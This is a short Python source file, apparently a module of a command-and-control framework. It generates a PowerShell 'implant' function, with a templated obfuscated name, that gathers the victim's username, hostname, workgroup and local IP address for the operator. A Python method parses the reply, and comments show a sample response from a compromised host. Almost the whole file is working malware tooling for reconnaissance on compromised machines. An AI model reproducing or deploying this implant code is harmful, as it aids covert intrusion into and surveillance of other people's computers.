class SystemInfo:
    type = "SI"
    args = None
    input = "sys_info"

    def process_implant_response(self, data):
        split_data = data.decode().split("\n")
        print(split_data)  # This should be a list of 4 items based on the below response.
        # Username: Kris
        # Hostname: DESKTOP - SUMPM3F
        # Domain: WORKGROUP
        # Local IP: 192.168.2.130
        return data.decode(), None

    def implant_text(self):
        var = '''
function {{ ron.obf_collect_sysinfo }}(){
    $h = hostname
    $d = (Get-WmiObject -Class Win32_ComputerSystem).Workgroup
    $a = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address
    $final_str = "Username: "+$env:UserName+"`nHostname: "+$h+"`nDomain: "+$d+"`nLocal IP: "+$a
    $Script:tr = $final_str
}
'''
        return var
